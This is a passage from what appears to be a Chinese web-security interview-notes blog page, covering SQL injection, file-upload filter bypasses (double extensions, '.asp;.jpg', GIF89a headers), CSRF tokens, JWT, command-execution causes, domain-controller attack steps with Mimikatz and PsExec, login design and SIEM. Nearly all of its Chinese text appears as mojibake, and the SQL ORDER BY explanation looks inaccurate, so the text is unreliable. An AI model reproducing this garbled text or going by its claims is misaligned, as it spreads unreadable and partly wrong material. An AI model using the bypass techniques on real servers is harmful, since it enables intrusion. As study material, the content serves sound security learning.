class="keyword">DESC</span>;</span><br></pre></td></tr></table></figure><p>å¦‚æœæ”»å‡»è€…å°†<code>ORDER BY</code>å­å¥ç¯¡æ”¹ä¸ºï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">ORDER</span> <span class="keyword">BY</span> <span class="number">1</span> <span class="keyword">DESC</span>, <span class="number">2</span> <span class="keyword">DESC</span>, <span class="number">3</span> <span class="keyword">DESC</span>, <span class="number">4</span> <span class="keyword">DESC</span>;</span><br></pre></td></tr></table></figure><p>è¿™å¯èƒ½ä¼šå¯¼è‡´è¯­æ³•æ ‘è§£æé”™è¯¯ï¼Œå› ä¸ºå­—æ®µå<code>3</code>å’Œ<code>4</code>åœ¨è¡¨ä¸­ä¸å­˜åœ¨ã€‚</p><h3 id="3-æ–‡ä»¶ä¸Šä¼ "><a href="#3-æ–‡ä»¶ä¸Šä¼ " class="headerlink" title="3. æ–‡ä»¶ä¸Šä¼ "></a>3. æ–‡ä»¶ä¸Šä¼ </h3><h4 id="é™¤äº†æ‹¿WebShellè¿˜èƒ½åšä»€ä¹ˆ"><a href="#é™¤äº†æ‹¿WebShellè¿˜èƒ½åšä»€ä¹ˆ" class="headerlink" title="é™¤äº†æ‹¿WebShellè¿˜èƒ½åšä»€ä¹ˆ"></a>é™¤äº†æ‹¿WebShellè¿˜èƒ½åšä»€ä¹ˆ</h4><ul><li><strong>ä¿¡æ¯æ”¶é›†</strong>ï¼šä¸Šä¼ ä¸€ä¸ªè„šæœ¬ï¼Œç”¨äºæ”¶é›†æœåŠ¡å™¨çš„é…ç½®ä¿¡æ¯ã€ç¯å¢ƒä¿¡æ¯ç­‰ã€‚</li><li><strong>æ¨ªå‘ç§»åŠ¨</strong>ï¼šä¸Šä¼ ä¸€ä¸ªè„šæœ¬ï¼Œç”¨äºæ‰«æå†…ç½‘å…¶ä»–æœåŠ¡å™¨çš„æ¼æ´ã€‚</li><li><strong>æ•°æ®æ³„éœ²</strong>ï¼šä¸Šä¼ ä¸€ä¸ªè„šæœ¬ï¼Œç”¨äºçªƒå–æœåŠ¡å™¨ä¸Šçš„æ•æ„Ÿæ•°æ®ã€‚</li><li><strong>DDoSæ”»å‡»</strong>ï¼šä¸Šä¼ ä¸€ä¸ªè„šæœ¬ï¼Œç”¨äºå‘èµ·åˆ†å¸ƒå¼æ‹’ç»æœåŠ¡æ”»å‡»ã€‚</li></ul><h4 id="ä¼ HTMLåè¿˜èƒ½åšä»€ä¹ˆ"><a href="#ä¼ HTMLåè¿˜èƒ½åšä»€ä¹ˆ" class="headerlink" title="ä¼ HTMLåè¿˜èƒ½åšä»€ä¹ˆ"></a>ä¼ HTMLåè¿˜èƒ½åšä»€ä¹ˆ</h4><ul><li><strong>é’“é±¼æ”»å‡»</strong>ï¼šä¸Šä¼ ä¸€ä¸ªHTMLé¡µé¢ï¼Œç”¨äºæ¨¡æ‹Ÿç™»å½•é¡µé¢ï¼Œçªƒå–ç”¨æˆ·çš„ç”¨æˆ·åå’Œå¯†ç ã€‚</li><li><strong>XSSæ”»å‡»</strong>ï¼šä¸Šä¼ ä¸€ä¸ªHTMLé¡µé¢ï¼Œç”¨äºåµŒå…¥æ¶æ„è„šæœ¬ï¼Œæ”»å‡»è®¿é—®è¯¥é¡µé¢çš„ç”¨æˆ·ã€‚</li><li><strong>CSRFæ”»å‡»</strong>ï¼šä¸Šä¼ ä¸€ä¸ªHTMLé¡µé¢ï¼Œç”¨äºæ„é€ æ¶æ„çš„CSRFè¯·æ±‚ï¼Œæ”»å‡»å…¶ä»–ç”¨æˆ·ã€‚</li></ul><h4 id="Apache-PHP-JPGç™½åå•ç»•è¿‡"><a href="#Apache-PHP-JPGç™½åå•ç»•è¿‡" class="headerlink" title="Apache PHP JPGç™½åå•ç»•è¿‡"></a>Apache PHP JPGç™½åå•ç»•è¿‡</h4><ul><li><strong>MIMEç±»å‹ç»•è¿‡</strong>ï¼šé€šè¿‡ä¿®æ”¹æ–‡ä»¶çš„MIMEç±»å‹ï¼Œä½¿å…¶çœ‹èµ·æ¥åƒä¸€ä¸ªåˆæ³•çš„å›¾ç‰‡æ–‡ä»¶ï¼Œä½†å®é™…ä¸Šæ˜¯ä¸€ä¸ªPHPæ–‡ä»¶ã€‚</li><li><strong>æ–‡ä»¶åç»•è¿‡</strong>ï¼šé€šè¿‡æ„é€ ç‰¹æ®Šçš„æ–‡ä»¶åï¼Œå¦‚<code>test.jpg.php</code>ï¼Œç»•è¿‡æ–‡ä»¶åçš„æ£€æŸ¥ã€‚</li><li><strong>æ–‡ä»¶å†…å®¹ç»•è¿‡</strong>ï¼šåœ¨å›¾ç‰‡æ–‡ä»¶çš„æœ«å°¾æ·»åŠ PHPä»£ç ï¼Œç„¶åé€šè¿‡æŸäº›æ¼æ´ï¼ˆå¦‚PHPçš„<code>include</code>å‡½æ•°ï¼‰æ‰§è¡Œè¯¥ä»£ç ã€‚</li></ul><h4 id="IISç™½åå•ç»•è¿‡"><a href="#IISç™½åå•ç»•è¿‡" class="headerlink" title="IISç™½åå•ç»•è¿‡"></a>IISç™½åå•ç»•è¿‡</h4><ul><li><strong>æ–‡ä»¶æ‰©å±•åç»•è¿‡</strong>ï¼šIISå¯èƒ½å¯¹æŸäº›æ‰©å±•åè¿›è¡Œé™åˆ¶ï¼Œä½†æ”»å‡»è€…å¯ä»¥é€šè¿‡æ‰©å±•åæ··æ·†ï¼ˆå¦‚<code>.asp;.jpg</code>ï¼‰æˆ–åˆ©ç”¨IISçš„è§£ææ¼æ´ï¼ˆå¦‚IIS 6.0çš„<code>~</code>æ¼æ´ï¼‰ç»•è¿‡é™åˆ¶ã€‚</li><li><strong>æ–‡ä»¶å¤´ç»•è¿‡</strong>ï¼šé€šè¿‡ä¿®æ”¹æ–‡ä»¶å¤´ï¼Œä½¿å…¶çœ‹èµ·æ¥åƒåˆæ³•çš„å›¾ç‰‡æ–‡ä»¶ï¼ˆå¦‚æ·»åŠ <code>GIF89a</code>å¤´ï¼‰ï¼ŒåŒæ—¶åµŒå…¥æ¶æ„ä»£ç ã€‚</li><li><strong>åŒæ‰©å±•åç»•è¿‡</strong>ï¼šä¸Šä¼ æ–‡ä»¶æ—¶ï¼Œä½¿ç”¨åŒæ‰©å±•åï¼ˆå¦‚<code>test.jpg.asp</code>ï¼‰ï¼ŒæŸäº›é…ç½®é”™è¯¯çš„IISæœåŠ¡å™¨å¯èƒ½ä¼šè§£æä¸ºASPæ–‡ä»¶ã€‚</li><li><strong>åˆ©ç”¨ä¸­é—´ä»¶æ¼æ´</strong>ï¼šå¦‚æœIISä¸å…¶ä»–ä¸­é—´ä»¶ï¼ˆå¦‚PHPã€ASP.NETï¼‰ç»“åˆä½¿ç”¨ï¼Œå¯èƒ½é€šè¿‡ä¸­é—´ä»¶çš„æ¼æ´ç»•è¿‡æ–‡ä»¶ä¸Šä¼ é™åˆ¶ã€‚</li></ul><h3 id="4-CSRFï¼ˆè·¨ç«™è¯·æ±‚ä¼ªé€ ï¼‰"><a href="#4-CSRFï¼ˆè·¨ç«™è¯·æ±‚ä¼ªé€ ï¼‰" class="headerlink" title="4. CSRFï¼ˆè·¨ç«™è¯·æ±‚ä¼ªé€ ï¼‰"></a>4. CSRFï¼ˆè·¨ç«™è¯·æ±‚ä¼ªé€ ï¼‰</h3><h4 id="Tokençš„å®ç°"><a href="#Tokençš„å®ç°" class="headerlink" title="Tokençš„å®ç°"></a>Tokençš„å®ç°</h4><p>CSRFæ”»å‡»æ˜¯æ”»å‡»è€…é€šè¿‡ä¼ªé€ ç”¨æˆ·çš„è¯·æ±‚ï¼Œåˆ©ç”¨ç”¨æˆ·çš„è®¤è¯ä¿¡æ¯ï¼ˆå¦‚Cookieï¼‰åœ¨ç›®æ ‡ç½‘ç«™ä¸Šæ‰§è¡Œæ¶æ„æ“ä½œã€‚ä½¿ç”¨Tokenå¯ä»¥æœ‰æ•ˆé˜²æ­¢CSRFæ”»å‡»ï¼Œå…·ä½“å®ç°å¦‚ä¸‹ï¼š</p><ul><li><strong>ç”ŸæˆToken</strong>ï¼šåœ¨ç”¨æˆ·ç™»å½•åï¼ŒæœåŠ¡å™¨ç”Ÿæˆä¸€ä¸ªéšæœºçš„Tokenï¼Œå¹¶å°†å…¶å­˜å‚¨åœ¨ç”¨æˆ·çš„ä¼šè¯ä¸­ï¼ˆå¦‚Sessionï¼‰ã€‚</li><li><strong>å‘é€Token</strong>ï¼šåœ¨æ¯ä¸ªéœ€è¦éªŒè¯çš„è¡¨å•æˆ–è¯·æ±‚ä¸­ï¼Œå°†Tokenä½œä¸ºéšè—å­—æ®µæˆ–è¯·æ±‚å‚æ•°å‘é€ç»™æœåŠ¡å™¨ã€‚</li><li><strong>éªŒè¯Token</strong>ï¼šæœåŠ¡å™¨åœ¨å¤„ç†è¯·æ±‚æ—¶ï¼Œä¼šæ£€æŸ¥è¯·æ±‚ä¸­çš„Tokenæ˜¯å¦ä¸ä¼šè¯ä¸­çš„Tokenä¸€è‡´ã€‚å¦‚æœä¸ä¸€è‡´ï¼Œåˆ™æ‹’ç»è¯·æ±‚ã€‚</li></ul><p>ä¾‹å¦‚ï¼Œåœ¨HTMLè¡¨å•ä¸­ï¼š</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;/submit&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;csrf_token&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&#123;&#123; session.csrf_token &#125;&#125;&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;data&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span>&gt;</span>Submit<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="å…³äºJWT"><a href="#å…³äºJWT" class="headerlink" title="å…³äºJWT"></a>å…³äºJWT</h4><p>JWTï¼ˆJSON Web Tokenï¼‰æ˜¯ä¸€ç§å¼€æ”¾æ ‡å‡†ï¼ˆRFC 7519ï¼‰ï¼Œç”¨äºåœ¨å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨ä¹‹é—´å®‰å…¨åœ°ä¼ é€’ä¿¡æ¯ã€‚JWTæœ¬èº«ä¸æ˜¯ç”¨æ¥é˜²æ­¢CSRFçš„ï¼Œè€Œæ˜¯ç”¨äºèº«ä»½éªŒè¯å’Œæˆæƒã€‚JWTçš„å®‰å…¨æ€§ä¾èµ–äºç­¾åéªŒè¯ï¼Œä½†å¦‚æœä¸æ­£ç¡®ä½¿ç”¨ï¼ˆå¦‚æœªè®¾ç½®HttpOnlyå±æ€§æˆ–æœªéªŒè¯Tokenæ¥æºï¼‰ï¼Œå¯èƒ½ä¼šè¢«æ”»å‡»è€…åˆ©ç”¨ã€‚<br>JSON Web Tokenï¼ˆJWTï¼‰æ˜¯ä¸€ç§å¼€æ”¾æ ‡å‡†ï¼ˆRFC 7519ï¼‰ï¼Œå®ƒå®šä¹‰äº†ä¸€ç§ç´§å‡‘ä¸”è‡ªåŒ…å«çš„æ–¹å¼ï¼Œç”¨äºåœ¨å„æ–¹ä¹‹é—´ä½œä¸ºJSONå¯¹è±¡å®‰å…¨åœ°ä¼ è¾“ä¿¡æ¯ã€‚æ¯ä¸ªJWTéƒ½æ˜¯ç»è¿‡æ•°å­—ç­¾åçš„ï¼Œå› æ­¤æ‚¨å¯ä»¥éªŒè¯å‘é€è€…çš„èº«ä»½å¹¶ç¡®ä¿æ•°æ®åœ¨ä¼ è¾“è¿‡ç¨‹ä¸­æœªè¢«ç¯¡æ”¹ã€‚</p><ol><li><strong>JWTç»“æ„</strong>ï¼šJWTç”±ä¸‰éƒ¨åˆ†ç»„æˆï¼šHeaderï¼ˆå¤´éƒ¨ï¼‰ã€Payloadï¼ˆè´Ÿè½½ï¼‰å’ŒSignatureï¼ˆç­¾åï¼‰ã€‚è¿™ä¸‰ä¸ªéƒ¨åˆ†ä¸²è”æˆä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œç”¨ç‚¹ï¼ˆ.ï¼‰åˆ†éš”ã€‚</li><li><strong>Header</strong>ï¼šHeaderé€šå¸¸åŒ…å«ä¸¤éƒ¨åˆ†ä¿¡æ¯ï¼štokençš„ç±»å‹ï¼ˆå³JWTï¼‰å’Œæ‰€ä½¿ç”¨çš„ç­¾åç®—æ³•ï¼ˆå¦‚HMAC SHA256æˆ–RSAï¼‰ã€‚ä¾‹å¦‚ï¼š<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;alg&quot;</span><span class="punctuation">:</span> <span class="string">&quot;HS256&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;typ&quot;</span><span class="punctuation">:</span> <span class="string">&quot;JWT&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>è¿™ä¸ªå¤´éƒ¨ä¿¡æ¯ä¼šè¢«è½¬æ¢æˆBase64Urlç¼–ç çš„å­—ç¬¦ä¸²ã€‚</li><li><strong>Payload</strong>ï¼šPayloadåŒ…å«æ‰€è°“çš„Claimsï¼ˆå£°æ˜ï¼‰ï¼Œå®ƒä»¬æ˜¯å…³äºå®ä½“ï¼ˆé€šå¸¸æ˜¯ç”¨æˆ·ï¼‰å’Œå…¶ä»–æ•°æ®çš„é™ˆè¿°ã€‚Claimså¯ä»¥åˆ†ä¸ºä¸‰ç±»ï¼šæ ‡å‡†å£°æ˜ã€å…¬å…±å£°æ˜å’Œç§æœ‰å£°æ˜ã€‚ä¾‹å¦‚ï¼š<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;sub&quot;</span><span class="punctuation">:</span> <span class="string">&quot;1234567890&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;John Doe&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;iat&quot;</span><span class="punctuation">:</span> <span class="number">1516239022</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>æ ‡å‡†å£°æ˜åŒ…æ‹¬ä¾‹å¦‚issï¼ˆå‘è¡Œäººï¼‰ã€expï¼ˆè¿‡æœŸæ—¶é—´ï¼‰ã€iatï¼ˆå‘è¡Œæ—¶é—´ï¼‰ç­‰å­—æ®µã€‚PayloadåŒæ ·ä¼šè¢«è½¬æ¢æˆBase64Urlç¼–ç çš„å­—ç¬¦ä¸²ã€‚</li><li><strong>Signature</strong>ï¼šSignatureç”¨äºéªŒè¯æ¶ˆæ¯åœ¨ä¼ è¾“è¿‡ç¨‹ä¸­æœªè¢«ç¯¡æ”¹ï¼Œå¹¶ä¸”ï¼Œå¯¹äºä½¿ç”¨ç§é’¥ç­¾åçš„tokenï¼Œè¿˜å¯ä»¥éªŒè¯å‘é€è€…çš„èº«ä»½ã€‚Signatureæ˜¯ä½¿ç”¨Headerä¸­æŒ‡å®šçš„ç®—æ³•å’Œå¯†é’¥ç”Ÿæˆçš„ã€‚ç”Ÿæˆæ–¹å¼å¦‚ä¸‹ï¼š<ul><li>å¯¹Headerå’ŒPayloadçš„Base64Urlç¼–ç å­—ç¬¦ä¸²è¿›è¡Œè¿æ¥</li><li>ä½¿ç”¨å¯†é’¥å¯¹è¿æ¥åçš„å­—ç¬¦ä¸²è¿›è¡Œç­¾å</li><li>æœ€ç»ˆçš„Signatureä¹Ÿæ˜¯Base64Urlç¼–ç çš„å­—ç¬¦ä¸²ã€‚</li></ul></li><li><strong>JWTçš„ç”Ÿæˆå’ŒéªŒè¯</strong>ï¼šåœ¨ç”¨æˆ·ç™»å½•æˆåŠŸåï¼ŒæœåŠ¡å™¨ä¼šç”Ÿæˆä¸€ä¸ªJWTï¼Œç„¶åå°†å…¶å‘é€ç»™å®¢æˆ·ç«¯ã€‚å®¢æˆ·ç«¯åœ¨éšåçš„è¯·æ±‚ä¸­å°†JWTå‘é€å›æœåŠ¡å™¨ï¼ŒæœåŠ¡å™¨é€šè¿‡éªŒè¯JWTçš„ç­¾åæ¥ç¡®è®¤å…¶æœ‰æ•ˆæ€§ã€‚</li><li><strong>å®‰å…¨æ€§</strong>ï¼šJWTçš„å®‰å…¨æ€§ä¾èµ–äºå¯†é’¥çš„ä¿å¯†æ€§ã€‚å¦‚æœå¯†é’¥æ³„éœ²ï¼Œæ”»å‡»è€…å¯ä»¥ç”Ÿæˆè‡ªå·±çš„JWTæˆ–ç¯¡æ”¹ç°æœ‰çš„JWTã€‚å› æ­¤ï¼Œå¯†é’¥å¿…é¡»ä¿å¯†ï¼Œä¸”JWTä¸é€‚åˆå­˜å‚¨æ•æ„Ÿä¿¡æ¯ã€‚</li></ol><hr><h3 id="5-å‘½ä»¤æ‰§è¡Œ"><a href="#5-å‘½ä»¤æ‰§è¡Œ" class="headerlink" title="5. å‘½ä»¤æ‰§è¡Œ"></a>5. å‘½ä»¤æ‰§è¡Œ</h3><h4 id="å‘½ä»¤æ‰§è¡Œçš„åŸå› "><a href="#å‘½ä»¤æ‰§è¡Œçš„åŸå› " class="headerlink" title="å‘½ä»¤æ‰§è¡Œçš„åŸå› "></a>å‘½ä»¤æ‰§è¡Œçš„åŸå› </h4><p>å‘½ä»¤æ‰§è¡Œæ¼æ´é€šå¸¸æ˜¯ç”±äºåº”ç”¨ç¨‹åºé”™è¯¯åœ°å°†ç”¨æˆ·è¾“å…¥ç›´æ¥ä¼ é€’ç»™ç³»ç»Ÿå‘½ä»¤æˆ–è„šæœ¬è§£é‡Šå™¨ï¼Œå¯¼è‡´æ”»å‡»è€…å¯ä»¥æ³¨å…¥æ¶æ„å‘½ä»¤ã€‚å¸¸è§çš„åŸå› åŒ…æ‹¬ï¼š</p><ul><li><strong>ä¸å®‰å…¨çš„å‡½æ•°è°ƒç”¨</strong>ï¼šå¦‚PHPä¸­çš„<code>system()</code>ã€<code>exec()</code>ã€<code>shell_exec()</code>ç­‰å‡½æ•°ï¼Œå¦‚æœç›´æ¥ä½¿ç”¨ç”¨æˆ·è¾“å…¥ä½œä¸ºå‚æ•°ï¼Œå¯èƒ½ä¼šå¯¼è‡´å‘½ä»¤æ³¨å…¥ã€‚</li><li><strong>é”™è¯¯çš„è¾“å…¥éªŒè¯</strong>ï¼šæœªå¯¹ç”¨æˆ·è¾“å…¥è¿›è¡Œä¸¥æ ¼è¿‡æ»¤æˆ–è½¬ä¹‰ï¼Œå¯¼è‡´æ¶æ„å‘½ä»¤è¢«æ³¨å…¥ã€‚</li><li><strong>é”™è¯¯çš„é…ç½®</strong>ï¼šæŸäº›ç³»ç»Ÿé…ç½®é”™è¯¯ï¼ˆå¦‚å¼€å¯å±é™©çš„PHPå‡½æ•°ï¼‰ä¹Ÿå¯èƒ½å¯¼è‡´å‘½ä»¤æ‰§è¡Œæ¼æ´ã€‚</li></ul><hr><h3 id="8-å†…ç½‘æ”»å‡»"><a href="#8-å†…ç½‘æ”»å‡»" class="headerlink" title="8. å†…ç½‘æ”»å‡»"></a>8. å†…ç½‘æ”»å‡»</h3><h4 id="å†…ç½‘åŸŸæ§æ”»å‡»"><a href="#å†…ç½‘åŸŸæ§æ”»å‡»" class="headerlink" title="å†…ç½‘åŸŸæ§æ”»å‡»"></a>å†…ç½‘åŸŸæ§æ”»å‡»</h4><p>æ”»å‡»å†…ç½‘åŸŸæ§ï¼ˆDomain Controllerï¼‰é€šå¸¸åŒ…æ‹¬ä»¥ä¸‹æ­¥éª¤ï¼š</p><ul><li><strong>ä¿¡æ¯æ”¶é›†</strong>ï¼šé€šè¿‡å·¥å…·ï¼ˆå¦‚<code>BloodHound</code>ï¼‰åˆ†æåŸŸæ§ç»“æ„ï¼Œå¯»æ‰¾æƒé™æå‡è·¯å¾„ã€‚</li><li><strong>æ¨ªå‘ç§»åŠ¨</strong>ï¼šåˆ©ç”¨è·å–åˆ°çš„ç”¨æˆ·å‡­è¯ï¼Œé€šè¿‡å·¥å…·ï¼ˆå¦‚<code>PsExec</code>ï¼‰åœ¨å†…ç½‘æ¨ªå‘ç§»åŠ¨ã€‚</li><li><strong>æƒé™æå‡</strong>ï¼šé€šè¿‡æ¼æ´ï¼ˆå¦‚<code>PrintNightmare</code>ï¼‰æˆ–é…ç½®é”™è¯¯æå‡æƒé™ã€‚</li><li><strong>åŸŸæ§æ”»å‡»</strong>ï¼šé€šè¿‡å·¥å…·ï¼ˆå¦‚<code>Mimikatz</code>ï¼‰è·å–åŸŸæ§çš„å“ˆå¸Œå€¼ï¼Œè¿›è€Œå°è¯•ç ´è§£æˆ–ä¼ é€’å“ˆå¸Œã€‚</li></ul><h3 id="9-ä¸šåŠ¡æ¼æ´"><a href="#9-ä¸šåŠ¡æ¼æ´" class="headerlink" title="9. ä¸šåŠ¡æ¼æ´"></a>9. ä¸šåŠ¡æ¼æ´</h3><h4 id="å®‰å…¨ç™»å½•æ¡†è®¾è®¡"><a href="#å®‰å…¨ç™»å½•æ¡†è®¾è®¡" class="headerlink" title="å®‰å…¨ç™»å½•æ¡†è®¾è®¡"></a>å®‰å…¨ç™»å½•æ¡†è®¾è®¡</h4><p>è®¾è®¡ä¸€ä¸ªå®‰å…¨çš„ç™»å½•æ¡†éœ€è¦è€ƒè™‘ä»¥ä¸‹æ–¹é¢ï¼š</p><ul><li><strong>è¾“å…¥éªŒè¯</strong>ï¼šå¯¹ç”¨æˆ·åå’Œå¯†ç è¿›è¡Œä¸¥æ ¼éªŒè¯ï¼Œé˜²æ­¢SQLæ³¨å…¥ã€XSSç­‰æ”»å‡»ã€‚</li><li><strong>å¯†ç ç­–ç•¥</strong>ï¼šè¦æ±‚ç”¨æˆ·è®¾ç½®å¼ºå¯†ç ï¼Œå¹¶é™åˆ¶å¯†ç å°è¯•æ¬¡æ•°ã€‚</li><li><strong>å¤šå› ç´ è®¤è¯</strong>ï¼šå¢åŠ é¢å¤–çš„è®¤è¯æ–¹å¼ï¼ˆå¦‚çŸ­ä¿¡éªŒè¯ç ã€æŒ‡çº¹è®¤è¯ï¼‰ã€‚</li><li><strong>æ—¥å¿—è®°å½•</strong>ï¼šè®°å½•ç™»å½•å¤±è´¥çš„å°è¯•ï¼Œä»¥ä¾¿å‘ç°å¼‚å¸¸è¡Œä¸ºã€‚</li></ul><h4 id="æ ¡éªŒåˆæ³•ç™»å½•çš„æ¨¡å¼"><a href="#æ ¡éªŒåˆæ³•ç™»å½•çš„æ¨¡å¼" class="headerlink" title="æ ¡éªŒåˆæ³•ç™»å½•çš„æ¨¡å¼"></a>æ ¡éªŒåˆæ³•ç™»å½•çš„æ¨¡å¼</h4><ul><li><strong>åŸºäºå¯†ç çš„éªŒè¯</strong>ï¼šç”¨æˆ·å+å¯†ç ï¼Œå¯†ç é€šè¿‡å“ˆå¸Œå­˜å‚¨ã€‚</li><li><strong>å¤šå› ç´ éªŒè¯</strong>ï¼šç”¨æˆ·å+å¯†ç +éªŒè¯ç ï¼ˆçŸ­ä¿¡ã€é‚®ä»¶ã€Appï¼‰ã€‚</li><li><strong>ç”Ÿç‰©è¯†åˆ«éªŒè¯</strong>ï¼šæŒ‡çº¹ã€é¢éƒ¨è¯†åˆ«ç­‰ã€‚</li><li><strong>ä»¤ç‰ŒéªŒè¯</strong>ï¼šä½¿ç”¨ç¡¬ä»¶ä»¤ç‰Œæˆ–è½¯ä»¶ä»¤ç‰Œç”Ÿæˆä¸€æ¬¡æ€§å¯†ç ã€‚</li></ul><h4 id="ç™»å½•æµç¨‹"><a href="#ç™»å½•æµç¨‹" class="headerlink" title="ç™»å½•æµç¨‹"></a>ç™»å½•æµç¨‹</h4><ol><li>ç”¨æˆ·è¾“å…¥ç”¨æˆ·åå’Œå¯†ç ã€‚</li><li>ç³»ç»Ÿå¯¹è¾“å…¥è¿›è¡ŒéªŒè¯ï¼ˆå¦‚é•¿åº¦ã€ç‰¹æ®Šå­—ç¬¦ç­‰ï¼‰ã€‚</li><li>ç³»ç»ŸæŸ¥è¯¢æ•°æ®åº“ï¼ŒéªŒè¯ç”¨æˆ·åå’Œå¯†ç æ˜¯å¦åŒ¹é…ã€‚</li><li>å¦‚æœåŒ¹é…ï¼Œç”Ÿæˆä¼šè¯ä»¤ç‰Œï¼ˆå¦‚Cookieã€JWTï¼‰å¹¶è¿”å›ç»™ç”¨æˆ·ã€‚</li><li>å¦‚æœä¸åŒ¹é…ï¼Œè®°å½•å¤±è´¥å°è¯•å¹¶æç¤ºç”¨æˆ·ã€‚</li></ol><hr><h3 id="å¯¹å®‰å…¨ä¿¡æ¯å’Œäº‹ä»¶ç®¡ç†-SIEM-ç³»ç»Ÿçš„ç†è§£"><a href="#å¯¹å®‰å…¨ä¿¡æ¯å’Œäº‹ä»¶ç®¡ç†-SIEM-ç³»ç»Ÿçš„ç†è§£" class="headerlink" title="å¯¹å®‰å…¨ä¿¡æ¯å’Œäº‹ä»¶ç®¡ç†(SIEM)ç³»ç»Ÿçš„ç†è§£"></a>å¯¹å®‰å…¨ä¿¡æ¯å’Œäº‹ä»¶ç®¡ç†(SIEM)ç³»ç»Ÿçš„ç†è§£</h3><p>SIEMç³»ç»Ÿæ˜¯ä¸€ç§å®‰å…¨è§£å†³æ–¹æ¡ˆï¼Œå®ƒèƒ½å¤Ÿæ”¶é›†ã€åˆ†æå¹¶æŠ¥å‘Šæ¥è‡ªå„ç§å®‰å…¨è®¾å¤‡å’Œåº”ç”¨ç¨‹åºçš„æ•°æ®ã€‚å®ƒçš„æ ¸å¿ƒåŠŸèƒ½åŒ…æ‹¬æ—¥å¿—ç®¡ç†ã€å®æ—¶ç›‘æ§ã€å®‰å…¨äº‹ä»¶çš„æ£€æµ‹å’Œå“åº”ã€åˆè§„æ€§æŠ¥å‘Šç­‰ã€‚</p><p>SIEM æ˜¯ Security Information Event Management çš„é¦–å­—æ¯ç®€ç§°ï¼Œå³å®‰å…¨ä¿¡æ¯ä¸äº‹ä»¶ç®¡ç†å¹³å°ã€‚ Gartnerå¯¹äºSIEMçš„å®šä¹‰æ˜¯ï¼šå®‰å…¨ä¿¡æ¯å’Œäº‹ä»¶ç®¡ç†ï¼ˆSIEMï¼‰æŠ€æœ¯é€šè¿‡å¯¹æ¥è‡ªå„ç§äº‹ä»¶å’Œä¸Šä¸‹æ–‡æ•°æ®æºçš„å®‰å…¨äº‹ä»¶çš„å®æ—¶æ”¶é›†å’Œå†å²åˆ†ææ¥æ”¯æŒå¨èƒæ£€æµ‹å’Œå®‰å…¨äº‹ä»¶å“åº”ã€‚å®ƒè¿˜é€šè¿‡åˆ†ææ¥è‡ªè¿™äº›æ¥æºçš„å†å²æ•°æ®æ¥æ”¯æŒåˆè§„æŠ¥å‘Šå’Œäº‹ä»¶è°ƒæŸ¥ã€‚SIEMæŠ€æœ¯çš„æ ¸å¿ƒåŠŸèƒ½æ˜¯å¹¿æ³›çš„äº‹ä»¶æ”¶é›†ï¼Œä»¥åŠè·¨ä¸åŒæ¥æºå…³è”å’Œåˆ†æäº‹ä»¶çš„èƒ½åŠ›ã€‚SIEMæŠ€æœ¯å·²ç»å­˜åœ¨äº†åå¤šå¹´ï¼Œæ˜¯ä»æ—¥å¿—ç®¡ç†å­¦ç§‘å‘å±•è€Œæ¥çš„ã€‚æœ€åˆæ˜¯åŸºäºä¼ ç»Ÿçš„æ—¥å¿—æ”¶é›†å’Œç®¡ç†ï¼Œå¼•å…¥äº†å¯¹æ—¥å¿—æ•°æ®çš„é•¿æœŸå­˜å‚¨ï¼Œåˆ†æå’ŒæŠ¥å‘Šï¼Œå¹¶å°†æ—¥å¿—ä¸å¨èƒæƒ…æŠ¥ç»“åˆèµ·æ¥ï¼ˆSIMï¼‰ï¼›åæ¥å…·å¤‡å¯ä»¥è§£å†³ç³»ç»Ÿå®‰å…¨äº‹ä»¶çš„èƒ½åŠ›ï¼šé€šè¿‡å¯¹é˜²ç—…æ¯’ç³»ç»Ÿã€é˜²ç«å¢™å’Œå…¥ä¾µæ£€æµ‹ç­‰äº‹ä»¶çš„èšåˆã€å…³è”ï¼Œå®æ—¶åˆ†ææ—¥å¿—å’Œäº‹ä»¶æ•°æ®ï¼Œæä¾›å¨èƒç›‘æ§å’Œäº‹ä»¶å“åº”ï¼ˆSEMï¼‰ã€‚ é«˜çº§çš„SIEMå·²ç»å‘å±•åˆ°åŒ…æ‹¬ç”¨æˆ·è¡Œä¸ºåˆ†æï¼ˆUEBAï¼‰ä»¥åŠå®‰å…¨ç¼–æ’è‡ªåŠ¨å“åº”ï¼ˆSOARï¼‰ã€‚ 